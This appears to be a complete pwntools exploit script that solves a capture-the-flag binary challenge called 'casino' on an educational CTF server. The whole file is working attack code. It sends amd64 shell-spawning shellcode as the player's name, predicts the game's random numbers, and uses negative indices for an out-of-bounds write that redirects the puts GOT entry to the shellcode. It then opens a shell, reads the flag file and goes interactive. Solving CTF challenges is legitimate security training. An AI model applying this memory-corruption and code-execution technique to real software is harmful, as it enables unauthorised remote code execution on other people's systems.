#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import random


context.arch = 'amd64'
r = remote('edu-ctf.csie.org', 10172)
# r = process('./casino-d5f55f428320c13ce558a57258cfe4c2')

guess = 0x6020d0
puts = 0x602020
name = 0x6020f0
seed = 0x602100
age = 0x602104
seed = 0x602100


shellcode = shellcraft.amd64.linux.sh()
seed = u32(asm(shellcode)[0x10:0x14])
age = u32(asm(shellcode)[0x14:0x18])

rand = process(['./rand', str(seed)])
randlist = [int(rand.readline().strip()) for _ in range(6)]
rand.close()

r.recvuntil('Your name: ')
r.sendline(asm(shellcode))

r.recvuntil('Your age: ')
r.sendline(str(age))

for i in range(6):
    r.recvuntil('Chose the number ' + str(i) + ': ')
    r.sendline(str(i))

r.recvuntil('Change the number? [1:yes 0:no]: ')
r.sendline('1')

r.recvuntil('Which number [1 ~ 6]: ')
r.sendline('-43')

r.recvuntil('Chose the number -44: ')
r.sendline(str(name))

for i, n in enumerate(randlist):
    r.recvuntil('Chose the number ' + str(i) + ': ')
    r.sendline(str(n))

r.recvuntil('Change the number? [1:yes 0:no]: ')
r.sendline('1')

r.recvuntil('Which number [1 ~ 6]: ')
r.sendline('-42')

r.recvuntil('Chose the number -43: ')
r.sendline('0')

r.sendline('cat /home/casino/flag')

r.interactive()
